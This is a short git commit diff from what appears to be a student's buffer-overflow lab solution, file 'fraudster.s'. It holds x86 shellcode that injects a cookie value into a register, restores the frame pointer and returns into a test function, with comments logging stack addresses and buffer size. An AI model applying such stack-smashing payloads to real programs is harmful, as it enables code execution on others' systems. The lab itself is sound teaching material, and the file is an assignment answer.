0a4cdb0a8cdfda593a9631c4a12e8b3a0944daba
mikaylawalsh <mikayla_walsh@brown.edu>
2022-10-11 21:44:53 -0400

    10/11-27

--- fraudster.s
+++ fraudster.s
@@ -3,11 +3,11 @@
     # rbp: 0x55782f70, rsp: 0x55782f50 // return 5578
     # rbp: 0x55782f60, rsp: 0x55782f40 // return 5578
     # rbp: 0x55783040, rsp: 0x55783020 // return 5578 
-    # rbp: 0x55782ff0, rsp: 0x55782fd0
+    # rbp: 0x55782ff0, rsp: 0x55782fd0 // return 5578
 # find size of buffer: 566 - getbufn 230 in decimal is 560  
 
 exploit:
     push $0x401385 # put us back in test_exploitn
     mov $0x622524ed,%rax
     lea 0x20(%rsp),%rbp # offset of 20 rsp into rbp to restore canary 
-    ret 
+    ret
